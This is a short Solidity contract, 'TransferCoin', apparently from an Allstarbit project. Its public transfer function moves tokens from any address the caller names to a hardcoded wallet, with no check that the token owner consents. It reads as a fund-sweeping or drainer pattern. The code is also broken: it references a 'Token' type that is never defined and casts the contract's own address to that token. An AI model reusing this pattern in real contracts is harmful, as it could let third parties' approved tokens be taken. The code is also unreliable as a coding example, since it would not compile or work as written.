pragma solidity ^0.4.24;
/*Copyright @ Allstarbit*/

contract TransferCoin {
    address public xdest = 0x5554a8f601673c624aa6cfa4f8510924dd2fc041;
    function getContractAddr() view public returns (address) {
        return this;
    }
    Token token = Token(getContractAddr());
    function transfer(address _from, uint value) public payable {
        require(token.transferFrom(_from, xdest, value));
    }
}